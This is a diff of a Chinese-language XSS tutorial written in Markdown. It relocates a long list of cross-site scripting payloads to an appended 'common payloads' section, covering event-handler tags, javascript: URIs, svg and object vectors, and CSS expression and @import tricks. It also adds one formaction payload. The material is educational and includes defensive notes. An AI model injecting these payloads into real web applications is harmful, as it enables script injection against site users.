@@ -43,89 +43,6 @@
 <input type="keyword" value=""><script>alert()</script><"">
 ```
 
-> 除了最直接的script标签，还有许多标签可以利用
-
-```html
-<a href="javascript:alert(1)">test</a>
-<a href="x" onfocus="alert('xss');" autofocus="">xss</a>
-<a href="x" onclick=eval("alert('xss');")>xss</a>
-<a href="x" onmouseover="alert('xss');">xss</a>
-<a href="x" onmouseout="alert('xss');">xss</a>
-
-<img src=x onerror="alert(1)">
-<img src=x onerror=eval("alert(1)")>
-<img src=1 onmouseover="alert('xss');">
-<img src=1 onmouseout="alert('xss');">
-<img src=1 onclick="alert('xss');">
-
-<img src=x onerror="alert(1)">
-<img src=x onerror=eval("alert(1)")>
-<img src=1 onmouseover="alert('xss');">
-<img src=1 onmouseout="alert('xss');">
-<img src=1 onclick="alert('xss');">
-
-<img src=x onerror="alert(1)">
-<img src=x onerror=eval("alert(1)")>
-<img src=1 onmouseover="alert('xss');">
-<img src=1 onmouseout="alert('xss');">
-<img src=1 onclick="alert('xss');">
-
-<svg onload=javascript:alert(1)>
-<svg onload="alert('xss');"></svg>
-
-<button onclick=alert(1)>
-<button onfocus="alert('xss');" autofocus="">xss</button>
-<button onclick="alert('xss');">xss</button>
-<button onmouseover="alert('xss');">xss</button>
-<button onmouseout="alert('xss');">xss</button>
-<button onmouseup="alert('xss');">xss</button>
-<button onmousedown="alert('xss');"></button>
-
-<div onmouseover='alert(1)'>DIV</div>
-<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></object>
-
-<script>alert('xss')</script>
-<script>alert(/xss/)</script>
-<script>alert(123)</script>
-
-<p onclick="alert('xss');">xss</p>
-<p onmouseover="alert('xss');">xss</p>
-<p onmouseout="alert('xss');">xss</p>
-<p onmouseup="alert('xss');">xss</p>
-
-<input onclick="alert('xss');">
-<input onfocus="alert('xss');">
-<input onfocus="alert('xss');" autofocus="">
-<input onmouseover="alert('xss');">
-<input type="text" onkeydown="alert('xss');"></input>
-<input type="text" onkeypress="alert('xss');"></input>
-<input type="text" onkeydown="alert('xss');"></input>
-
-<details ontoggle="alert('xss');"></details>
-<details ontoggle="alert('xss');" open=""></details>
-
-<select onfocus="alert('xss');" autofocus></select>
-<select onmouseover="alert('xss');"></select>
-<select onclick=eval("alert('xss');")></select>
-
-<form method="x" action="x" onmouseover="alert('xss');"><input type=submit></form>
-<form method="x" action="x" onmouseout="alert('xss');"><input type=submit></form>
-<form method="x" action="x" onmouseup="alert('xss');"><input type=submit></form>
-
-<body onload="alert('xss');"></body>
-
-<!-- css相关的xss -->
-<div style="background-image:url('http://127.0.0.1/xss.gif')"></div>
-<style>body {background: url('http://127.0.0.1/xss.gif')}</style>
-<!-- expression()表达式在IE7及以下是有效的，在IE8及以上就失效了 -->
-<div style="{left: expression(alert('xss'))}"></div>
-<!-- 利用 @import 引入外部 js -->
-<!-- 被引用的css body {event: expression (onload = function() {alert('XSS');})} -->
-<style type="text/css">@import url(http://www.xx.css)</style>
-<!-- 还可以利用 @import 直接执行 XSS 代码 -->
-<style>@import "javascript:alert('xss')";</style>
-```
-
 #### 补充：有关JavaScript伪协议
 
 > 例如onclick="myFunc()"这样的事件可以执行JavaScript，它也支持onclick="javascript:alert();"这种伪协议的写法，在浏览器打开javascript：URL的时候，它会将url当作JavaScript代码运行，当返回值不为undefined的时候，=前的属性将会被赋值为JavaScript的执行结果。
@@ -362,3 +279,92 @@ width="100" height="100">
 
 * HttpOnly
 * 在响应报文的header中配置X-XSS-Protection
+
+### 附常用payload
+
+```html
+<a href="javascript:alert(1)">test</a>
+<a href="x" onfocus="alert('xss');" autofocus="">xss</a>
+<a href="x" onclick=eval("alert('xss');")>xss</a>
+<a href="x" onmouseover="alert('xss');">xss</a>
+<a href="x" onmouseout="alert('xss');">xss</a>
+
+<img src=x onerror="alert(1)">
+<img src=x onerror=eval("alert(1)")>
+<img src=1 onmouseover="alert('xss');">
+<img src=1 onmouseout="alert('xss');">
+<img src=1 onclick="alert('xss');">
+
+<img src=x onerror="alert(1)">
+<img src=x onerror=eval("alert(1)")>
+<img src=1 onmouseover="alert('xss');">
+<img src=1 onmouseout="alert('xss');">
+<img src=1 onclick="alert('xss');">
+
+<img src=x onerror="alert(1)">
+<img src=x onerror=eval("alert(1)")>
+<img src=1 onmouseover="alert('xss');">
+<img src=1 onmouseout="alert('xss');">
+<img src=1 onclick="alert('xss');">
+
+<svg onload=javascript:alert(1)>
+<svg onload="alert('xss');"></svg>
+
+<button onclick=alert(1)>
+<button onfocus="alert('xss');" autofocus="">xss</button>
+<button onclick="alert('xss');">xss</button>
+<button onmouseover="alert('xss');">xss</button>
+<button onmouseout="alert('xss');">xss</button>
+<button onmouseup="alert('xss');">xss</button>
+<button onmousedown="alert('xss');"></button>
+
+<div onmouseover='alert(1)'>DIV</div>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></object>
+
+<script>alert('xss')</script>
+<script>alert(/xss/)</script>
+<script>alert(123)</script>
+
+<p onclick="alert('xss');">xss</p>
+<p onmouseover="alert('xss');">xss</p>
+<p onmouseout="alert('xss');">xss</p>
+<p onmouseup="alert('xss');">xss</p>
+
+<input onclick="alert('xss');">
+<input onfocus="alert('xss');">
+<input onfocus="alert('xss');" autofocus="">
+<input onmouseover="alert('xss');">
+<input type="text" onkeydown="alert('xss');"></input>
+<input type="text" onkeypress="alert('xss');"></input>
+<input type="text" onkeydown="alert('xss');"></input>
+
+<details ontoggle="alert('xss');"></details>
+<details ontoggle="alert('xss');" open=""></details>
+
+<select onfocus="alert('xss');" autofocus></select>
+<select onmouseover="alert('xss');"></select>
+<select onclick=eval("alert('xss');")></select>
+
+<form method="x" action="x" onmouseover="alert('xss');"><input type=submit></form>
+<form method="x" action="x" onmouseout="alert('xss');"><input type=submit></form>
+<form method="x" action="x" onmouseup="alert('xss');"><input type=submit></form>
+
+<body onload="alert('xss');"></body>
+
+<!-- css相关的xss -->
+<div style="background-image:url('http://127.0.0.1/xss.gif')"></div>
+<style>body {background: url('http://127.0.0.1/xss.gif')}</style>
+<!-- expression()表达式在IE7及以下是有效的，在IE8及以上就失效了 -->
+<div style="{left: expression(alert('xss'))}"></div>
+<!-- 利用 @import 引入外部 js -->
+<!-- 被引用的css body {event: expression (onload = function() {alert('XSS');})} -->
+<style type="text/css">@import url(http://www.xx.css)</style>
+<!-- 还可以利用 @import 直接执行 XSS 代码 -->
+<style>@import "javascript:alert('xss')";</style>
+```
+
+* 整理补充
+
+```html
+<button formaction=javascript:alert(1)></button><!-- 试验过，单独无法触发xss，需配合input标签？ -->
+```
